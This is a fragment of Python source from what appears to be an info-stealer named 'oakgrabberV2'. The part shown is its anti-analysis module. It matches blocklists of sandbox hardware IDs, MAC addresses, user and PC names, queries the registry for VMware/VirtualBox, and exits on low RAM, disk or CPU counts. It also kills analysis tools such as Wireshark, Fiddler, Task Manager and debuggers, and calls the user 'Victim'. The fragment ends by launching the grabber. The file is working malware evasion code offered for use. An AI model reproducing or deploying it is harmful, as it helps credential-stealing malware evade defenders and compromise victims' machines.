            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363',
            '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
            '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865',
            '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C',
            'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
            'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712',
            '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA',
            '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
            '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C',
            'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E',
            '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
            '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35',
            'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9',
            '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
            '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71',
            '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A',
            'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3',
            '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1',
            'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6', '8E291742-7427-5849-75B0-01B5943CEFAD']
        self.process = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice",
            "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
            "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg",
            "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient",
            "ksdumper", "joeboxserver"]
        for func in [self.listCheck, self.registryCheck, self.specsCheck, self.check_process]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def listCheck(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if ntpath.exists(path):
                self.programExit()

        for user in self.Users:
            Victim = os.getlogin()
            if Victim == user:
                self.programExit()

        for pcName in self.Names:
            Victim_pc = os.getenv("COMPUTERNAME")
            if Victim_pc == pcName:
                self.programExit()

        for hwid in self.HWIDS:
            hardwareid = subprocess.check_output(
                'wmic csproduct get uuid').decode().split('\n')[1].strip()
            if hardwareid == hwid:
                self.programExit()
        for macs in self.Macs:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            if mac == macs:
                self.programExit()

    def check_process(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.process):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def specsCheck(self):
        # would not recommend changing this to over 2gb since some actually have 3gb of ram
        ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
        if int(ram) <= 2:  # 2gb or less ram
            self.programExit()
        disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
        if int(disk) <= 50:  # 50gb or less disc space
            self.programExit()
        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
            self.programExit()

    def registryCheck(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    starttime = time.time()
    try:
        requests.get('https://1.1.1.1')
    except:
        os._exit(0)
    asyncio.run(oakgrabberV2().init())